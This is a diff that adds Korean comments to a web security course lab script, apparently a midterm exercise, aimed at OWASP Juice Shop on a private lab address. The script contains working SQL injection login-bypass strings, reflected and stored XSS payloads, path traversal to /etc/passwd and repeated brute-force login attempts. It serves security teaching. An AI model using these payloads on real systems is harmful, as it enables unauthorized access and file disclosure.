@@ -139,11 +139,11 @@ curl -sI http://10.20.30.80:3000 | grep -i set-cookie
 
 echo ""
 echo "=== robots.txt ==="
-curl -s http://10.20.30.80:3000/robots.txt
+curl -s http://10.20.30.80:3000/robots.txt             # silent 모드
 
 echo ""
 echo "=== 보안 헤더 존재 여부 ==="
-for header in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" "Strict-Transport-Security" "X-XSS-Protection"; do
+for header in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" "Strict-Transport-Security" "X-XSS-Protection"; do  # 반복문 시작
   value=$(curl -sI http://10.20.30.80:3000 | grep -i "$header" | head -1)
   if [ -n "$value" ]; then
     echo "[설정됨] $value"
@@ -183,21 +183,21 @@ echo "=== 비밀번호 정책 점검 ==="
 # 짧은 비밀번호
 result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/ \
   -H "Content-Type: application/json" \
-  -d '{"email":"mid1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}')
+  -d '{"email":"mid1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}')  # 요청 데이터(body)
 echo "1자 PW: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('허용' if 'id' in d.get('data',{}) else '거부')" 2>/dev/null)"
 
 # 숫자만
 result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/ \
   -H "Content-Type: application/json" \
-  -d '{"email":"mid2@test.com","password":"123456","passwordRepeat":"123456","securityQuestion":{"id":1},"securityAnswer":"a"}')
+  -d '{"email":"mid2@test.com","password":"123456","passwordRepeat":"123456","securityQuestion":{"id":1},"securityAnswer":"a"}')  # 요청 데이터(body)
 echo "숫자만: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('허용' if 'id' in d.get('data',{}) else '거부')" 2>/dev/null)"
 
 echo ""
 echo "=== 무차별 대입 방어 ==="
-for i in $(seq 1 5); do
+for i in $(seq 1 5); do                                # 반복문 시작
   code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.30.80:3000/rest/user/login \
     -H "Content-Type: application/json" \
-    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')
+    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')  # 요청 데이터(body)
   echo "시도 $i: HTTP $code"
 done
 ```
@@ -208,7 +208,7 @@ done
 echo "=== JWT 분석 ==="
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"mid1@test.com","password":"1"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+  -d '{"email":"mid1@test.com","password":"1"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 if [ -n "$TOKEN" ]; then
   echo "JWT Header:"
@@ -232,7 +232,7 @@ echo "=== SQL Injection ==="
 # 로그인 SQLi
 result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}")
+  -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}")  # 요청 데이터(body)
 echo "로그인 SQLi: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('취약' if 'token' in d.get('authentication',{}) else '안전')" 2>/dev/null)"
 
 # 검색 SQLi
@@ -247,7 +247,7 @@ echo "검색 SQLi: 정상=$result1, 주입=$result2 $([ "$result1" != "$result2"
 echo "=== XSS 점검 ==="
 
 # Reflected XSS
-for payload in '<script>alert(1)</script>' '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>'; do
+for payload in '<script>alert(1)</script>' '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>'; do  # 반복문 시작
   encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
   result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$encoded")
   if echo "$result" | grep -q "alert(1)"; then
@@ -262,7 +262,7 @@ if [ -n "$TOKEN" ]; then
   curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer $TOKEN" \
-    -d '{"comment":"<script>alert(1)</script>","rating":1,"captchaId":0,"captcha":"-1"}' > /dev/null 2>&1
+    -d '{"comment":"<script>alert(1)</script>","rating":1,"captchaId":0,"captcha":"-1"}' > /dev/null 2>&1  # 요청 데이터(body)
   stored=$(curl -s http://10.20.30.80:3000/api/Feedbacks/ | grep -c "alert(1)")
   echo "저장 XSS (피드백): $( [ $stored -gt 0 ] && echo '취약' || echo '안전')"
 fi
@@ -280,12 +280,12 @@ echo "PHP 업로드: $result"
 
 echo ""
 echo "=== 경로 순회 ==="
-for payload in "../etc/passwd" "%2e%2e/etc/passwd" "..%252f..%252fetc/passwd"; do
+for payload in "../etc/passwd" "%2e%2e/etc/passwd" "..%252f..%252fetc/passwd"; do  # 반복문 시작
   result=$(curl -s "http://10.20.30.80:3000/ftp/$payload" | head -1)
   echo "Payload: $payload → ${result:0:50}"
 done
 
-rm -f /tmp/mid_test.php
+rm -f /tmp/mid_test.php                                # 파일 삭제
 ```
 
 ---
@@ -295,19 +295,19 @@ rm -f /tmp/mid_test.php
 ```bash
 echo "=== 정보 노출 ==="
 # 에러 메시지
-curl -s http://10.20.30.80:3000/api/Products/abc | python3 -m json.tool 2>/dev/null | head -10
+curl -s http://10.20.30.80:3000/api/Products/abc | python3 -m json.tool 2>/dev/null | head -10  # silent 모드
 
 echo ""
 echo "=== 접근 제어 ==="
 # 인증 없이 API 접근
-for api in "api/Products/1" "api/Feedbacks" "api/Challenges" "api/Users"; do
+for api in "api/Products/1" "api/Feedbacks" "api/Challenges" "api/Users"; do  # 반복문 시작
   code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/$api")
   echo "[$code] /$api (인증 없이)"
 done
 
 echo ""
 echo "=== HTTPS 설정 ==="
-curl -s -o /dev/null -w "%{http_code}" https://10.20.30.80:3000 2>/dev/null || echo "HTTPS 미지원"
+curl -s -o /dev/null -w "%{http_code}" https://10.20.30.80:3000 2>/dev/null || echo "HTTPS 미지원"  # silent 모드
 ```
 
 ---
@@ -339,7 +339,7 @@ curl -s -o /dev/null -w "%{http_code}" https://10.20.30.80:3000 2>/dev/null || e
   ```bash
   curl -X POST http://10.20.30.80:3000/rest/user/login \
     -H "Content-Type: application/json" \
-    -d '{"email":"' OR 1=1--","password":"x"}'
+    -d '{"email":"' OR 1=1--","password":"x"}'         # 요청 데이터(body)
   ```
 - **영향**: 관리자 계정 무단 접근 가능
 - **권고 사항**: Prepared Statement 적용, 입력값 검증
@@ -396,10 +396,10 @@ JuiceShop에는 난이도별 챌린지가 있다. 중간고사에서 해결하�
 
 ```bash
 # 챌린지 목록 조회
-curl -s http://10.20.30.80:3000/api/Challenges/ | python3 -c "
+curl -s http://10.20.30.80:3000/api/Challenges/ | python3 -c "  # silent 모드
 import sys, json
 data = json.load(sys.stdin).get('data', [])
-for c in sorted(data, key=lambda x: x.get('difficulty', 0)):
+for c in sorted(data, key=lambda x: x.get('difficulty', 0)):  # 반복문 시작
     solved = '해결' if c.get('solved') else '미해결'
     print(f'[{solved}] 난이도{c.get(\"difficulty\",\"?\")} - {c.get(\"name\",\"\")}')
 " 2>/dev/null | head -20
